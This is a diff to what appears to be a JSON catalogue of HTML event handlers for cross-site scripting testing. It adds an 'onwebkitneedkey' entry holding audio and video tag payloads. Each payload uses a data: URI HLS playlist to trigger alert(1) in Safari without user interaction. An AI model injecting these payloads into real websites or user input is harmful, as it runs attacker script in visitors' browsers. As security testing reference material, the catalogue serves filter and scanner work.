@@ -6507,5 +6507,22 @@
         "interaction": true
       }
     ]
+  },
+  "onwebkitneedkey": {
+    "description": "Fires when an HTML media element encounters encrypted content and needs a decryption key from the page",
+    "tags": [
+      {
+        "tag": "audio",
+        "code": "<audio src=data:,%23EXTM3U%0A%23EXT-X-TARGETDURATION:1%0A%23EXT-X-KEY:METHOD=AES-128,URI=%22skd:%22%0A%23EXTINF:1%0Ax onwebkitneedkey=alert(1)></audio>",
+        "browsers": ["safari"],
+        "interaction": false
+      },
+      {
+        "tag": "video",
+        "code": "<video src=data:,%23EXTM3U%0A%23EXT-X-TARGETDURATION:1%0A%23EXT-X-KEY:METHOD=AES-128,URI=%22skd:%22%0A%23EXTINF:1%0Ax onwebkitneedkey=alert(1)></video>",
+        "browsers": ["safari"],
+        "interaction": false
+      }
+    ]
   }
 }
